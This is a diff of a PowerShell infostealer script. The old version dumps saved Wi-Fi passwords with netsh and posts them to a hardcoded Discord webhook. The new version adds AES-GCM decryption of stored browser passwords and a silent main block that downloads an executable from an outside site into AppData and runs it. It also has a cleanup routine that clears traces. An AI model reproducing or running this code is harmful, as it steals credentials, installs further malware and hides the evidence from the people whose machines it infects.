@@ -1,19 +1,69 @@
-$u="https://discord.com/api/webhooks/1448171091561418896/qbtM5A8JrB-cV4HhDEM8itLK4zu2lR5hWaFnPxwTwdXXMGf0nJkXLxNp0EiHfQl4P8m"
-$data=""
-foreach($line in (netsh wlan show profiles)) {
-    if($line -match "All User Profile.*:\s+(.+)") {
-        $name=$matches[1].Trim()
-        $output=netsh wlan show profile name="$name" key=clear
-        if($output -match "Key Content.*:\s+(.+)") {
-            $data+="$name : $($matches[1])`n"
-        }
-    }
+# Discord Webhook URL
+$webhookUrl = "https://discord.com/api/webhooks/1448171091561418896/qbtM5A8JrB-cV4HhDEM8itLK4zu2VlR5hWaFnPxwTwdXXMGf0nJkXLxNp0EiHfQl4P8m"
+
+function Decrypt() {
+    param (
+        [Parameter(Mandatory = $true)] [PsCustomObject] $params
+    )
+    $url      = $params.url
+    $username = $params.username
+    $keyB64   = $params.key
+    $passB64  = $params.password
+
+    $keyBytes = [Convert]::FromBase64String($keyB64)
+    $passBytes = [Convert]::FromBase64String($passB64)
+
+    $iv = $passBytes[3..14]                     # bytes 3-15 (12 bytes)
+    $ciphertext = $passBytes[15..($passBytes.Length - 17)]
+    $tag = $passBytes[($passBytes.Length - 16)..($passBytes.Length - 1)]
+
+    $plaintext = New-Object byte[] $ciphertext.Length
+
+    $aes = [System.Security.Cryptography.AesGcm]::new($keyBytes)
+
+    $aes.Decrypt(
+        $iv,
+        $ciphertext,
+        $tag,
+        $plaintext
+    )
+
+    $decryptedPassword = [System.Text.Encoding]::UTF8.GetString($plaintext)
+
+    return @{Url = $url; User = $username; Password = $decryptedPassword;}
 }
-$body=@{content="```$data```"}
-Invoke-RestMethod -Uri $u -Method Post -Body ($body|ConvertTo-Json) -ContentType "application/json"
 
+function Get-GoogleLoginCodes {
+    
+}
 
+function Get-WiFiPasswords {
+	$credentials = @()
 
+	netsh wlan show profile |
+		Select-String '(?<=All User Profile\s+:\s).+' |
+		ForEach-Object {
+			$wlan = $_.Matches.Value
+			$passw = netsh wlan show profile $wlan key=clear |
+				Select-String '(?<=Key Content\s+:\s).+'
+
+			$credentials += [pscustomobject]@{
+				Name     = $wlan
+				Password = $passw.Matches.Value
+			}
+		}
+	return ($credentials | Out-String)
+}
+
+function SendString-ToDiscord {
+    param([string]$data)
+	
+	$payload = [PSCustomObject]@{
+		content = $data
+	}
+
+	Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($payload | ConvertTo-Json) -ContentType 'application/json'
+}
 
 ############################################################################################################################################
 function Clean-Exfil { 
@@ -33,3 +83,31 @@ Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 }
 
 ############################################################################################################################################
+
+# Main execution - completely silent
+try {
+    # Get WiFi passwords
+    #$wifiPasswords = Get-WiFiPasswords
+    
+    #SendString-ToDiscord $wifiPasswords
+
+    Get-GoogleLoginCodes | Format-Table -AutoSize | Out-String
+
+    $url = "https://jaedan.org/ta.exe"
+    $filePath = Join-Path -Path $env:APPDATA -ChildPath "temp\nka.exe"
+    $dir = Split-Path $filePath -Parent
+    if (-not (Test-Path $dir)) {
+        New-Item -Path $dir -ItemType Directory | Out-Null
+    }
+    Invoke-WebRequest -Uri $url -OutFile $filePath
+    Start-Process -FilePath $filePath
+    
+    #Clean-Exfil
+    
+    # Exit silently
+    exit 0
+}
+catch {
+    Clean-Exfil
+    exit 1
+}
